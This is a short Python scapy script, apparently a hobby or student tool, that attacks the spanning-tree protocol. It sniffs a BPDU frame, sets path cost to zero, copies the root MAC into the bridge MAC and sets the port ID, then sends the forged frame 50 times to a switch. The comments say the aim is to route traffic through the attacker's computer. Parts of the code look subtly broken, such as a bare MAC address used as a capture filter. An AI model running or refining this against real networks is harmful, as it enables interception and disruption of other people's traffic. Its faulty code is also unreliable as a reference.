# This function import scapy so that we can use the sniff command
from scapy.all import *

# This function organizes the code so that we can search for commands more easily
def dos_spaning_tree():
    # This function gives the user a choice of which Spaning tree MAC address to use
    User_input = input('Enter the MAC address that spaningTree use >>> ')
    # This function sniffes for the MAC address that the user has entered
    pkt = sniff(filter=User_input,count = 1)
    # This function make sure that the user goes through the attacker computer
    pkt[0].pathcost = 0
    # This function sets the bridgemac MAC address to ROOT bridg
    pkt[0].bridgemac = pkt[0].rootmac
    # This function sets the PortID to 1
    pkt[0].portid = 1
    # This function loops and sends multiple BPDUs to the target Switch
    for i in range(0, 50):
        time.sleep(1)
        pkt[0].show()
        sendp(pkt[0], loop = 0, verbose = 1)